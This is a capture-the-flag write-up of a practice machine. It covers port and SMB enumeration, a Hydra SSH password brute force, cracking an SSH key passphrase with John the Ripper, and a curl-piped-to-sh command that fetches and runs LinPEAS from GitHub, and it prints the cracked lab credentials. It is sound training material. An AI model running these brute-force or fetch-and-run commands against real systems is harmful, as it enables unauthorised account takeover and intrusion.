# CTF Writeup -- Exploiting Weak Credentials and Privilege Escalation

## Enumeration

### Nmap Scan

Initial port scanning revealed several open services:

``` bash
nmap -sC -sV 10.201.123.193
```

    Not shown: 994 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    8009/tcp open  ajp13
    8080/tcp open  http-proxy
    MAC Address: 16:FF:C4:EE:07:79 (Unknown)

The box is running SSH, web services (port 80 & 8080), and SMB
(139/445).

------------------------------------------------------------------------

### Web Enumeration

Using **Gobuster** against the HTTP service on port 80 uncovered an
interesting `/development` directory:

``` bash
gobuster dir -u http://10.201.123.193 -w /usr/share/wordlists/dirb/common.txt
```

    /development          (Status: 301) [--> http://10.201.123.193/development/]
    /index.html           (Status: 200)
    /server-status        (Status: 403)

Inside `/development`, there were developer notes hinting that the user
**jan** had a weak password.

------------------------------------------------------------------------

### SMB Enumeration

Running **enum4linux** against the target listed three valid local
users:

``` bash
enum4linux -a 10.201.123.193
```

    S-1-22-1-1000 Unix User\kay (Local User)
    S-1-22-1-1001 Unix User\jan (Local User)
    S-1-22-1-1002 Unix User\ubuntu (Local User)

Combined with the hint from `/development`, this suggested brute forcing
**jan's SSH password**.

------------------------------------------------------------------------

## Exploitation

### SSH Brute Force

Using **Hydra** with the RockYou wordlist:

``` bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.201.123.193 -t 4
```

Successful credentials:

    jan : armando

We can now SSH into the machine as **jan**.

------------------------------------------------------------------------

## Privilege Escalation

### Enumeration with LinPEAS

After gaining a foothold, ran **LinPEAS** to enumerate privilege
escalation vectors:

``` bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS discovered an SSH private key (`id_rsa`) belonging to user
**kay**.

------------------------------------------------------------------------

### Cracking the Private Key

The key was encrypted, so it was converted into a hash and cracked with
**John the Ripper**:

``` bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

The passphrase was cracked:

    beeswax

------------------------------------------------------------------------

### Access as Kay

Using the decrypted private key, we SSH'd into the box as **kay**:

``` bash
ssh -i id_rsa kay@10.201.123.193
```

Inside kay's home directory was a file named `pass.bak`.

``` bash
cat pass.bak
```

This revealed the **final flag**.

------------------------------------------------------------------------

## Conclusion

This machine required:

-   Enumeration of SMB and web services\
-   Identifying weak SSH credentials (jan → armando)\
-   Privilege escalation via Kay's SSH private key (passphrase:
    beeswax)\
-   Extracting the final flag from Kay's account
